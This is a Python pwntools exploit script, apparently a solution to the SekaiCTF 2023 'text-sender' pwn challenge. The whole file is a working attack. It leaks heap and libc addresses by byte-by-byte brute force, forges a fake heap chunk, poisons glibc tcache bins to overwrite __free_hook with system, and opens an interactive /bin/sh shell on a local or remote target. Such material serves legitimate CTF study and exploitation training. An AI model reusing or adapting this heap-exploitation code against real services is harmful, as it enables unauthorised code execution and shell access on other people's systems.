#!/usr/bin/env python3

# type: ignore
# flake8: noqa

"""
Based on the author solution:
https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/pwn/text-sender/solution/solve.py
"""

from pwn import *

elf = context.binary = ELF("./textsender", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def set_sender(s):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"name: ", s)


def add_message(r, msg):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Receiver: ", r)
    io.sendlineafter(b"Message: ", msg)


def send_all():
    io.sendlineafter(b"> ", b"5")


def print_all():
    io.sendlineafter(b"> ", b"4")


def edit_message(r, msg):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Name: ", r)
    resp = io.recvline()
    if b"Cannot find name!" in resp:
        return False
    io.sendlineafter(b"New message: ", msg)
    return True


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


env = {}
io = start()

for i in range(8):
    add_message(f"{str(i)*8}".encode(), f"{str(i)*8}".encode())
send_all()

for i in range(8):
    add_message(f"{str(i)*8}".encode(), f"{str(i)*8}".encode())
set_sender(b"sender")
send_all()

for i in range(6):
    add_message(f"{str(i)*8}".encode(), f"{str(i)*8}".encode())

heap_leak = []
for i in range(0x10):
    found = False
    for b in range(256):
        if (b >= 0x8) and (b <= 0xd):
            continue
        p = (b"5" * 8).ljust(0x70, b"\x00")
        p += flat(0, 0x201)
        p += bytes(heap_leak)
        if edit_message(p + p8(b), b"a"):
            found = True
            heap_leak.append(b)
            break
    if not found:
        log.failure("whitespace char in heap address, aborting")
        io.close()
        quit()

heap = u64(bytes(heap_leak[8:])) >> 12 << 12
log.info(f"{heap=:#x}")

libc_leak = []
for i in range(0x08):
    found = False
    for b in range(256):
        if (b >= 0x8) and (b <= 0xd):
            continue
        p = (b"5" * 8).ljust(0x70, b"\x00")
        p += flat(0, 0x201)
        p += bytes(heap_leak).ljust(0x1f0, b"\x00")
        p += flat(0, 0x21)
        p += bytes(libc_leak)
        if edit_message(p + p8(b), b"a"):
            found = True
            libc_leak.append(b)
            break
    if not found:
        log.failure("whitespace char in libc address, aborting")
        io.close()
        quit()

libc_leak = u64(bytes(libc_leak))
libc.address = libc_leak - 0x1c5c10
log.info(f"{libc.address=:#x}")

# For some reason, 0x2860 fake chunk size does not work
p = flat(0, 0,
         0, 0x2850,
         heap + 0x10d0, heap + 0x10d0)
edit_message(b"5" * 8, p)
add_message(b"dummy", b"dummy")
add_message(b"victim".ljust(0x70, b"\x00") + p64(0x2850), b"victim")
set_sender(b"padding")

send_all()

# preserve 0x20 tcachebins
payload = b'\x00' * 0x1d8 + p64(0x21)
payload += p64(((heap + 0x12c0) >> 12) ^ (heap + 0x1020)) + p64(heap + 0x10)

# poison 0x80 tcachebins (which is used for storing receiver)
payload += b'\x00' * 0x8 + p64(0x81)
payload += p64(((heap + 0x12e0) >> 12) ^ libc.sym['__free_hook'])
payload += p64(heap + 0x10)

# Chunk allocated overlaps with some of the tcachebins
# Hence, we could do tcache poisoning
edit_message(payload, b"a")

add_message(b"0" * 8, b"/bin/sh\x00")
add_message(p64(libc.symbols["system"]), b"a")

send_all()

io.interactive()
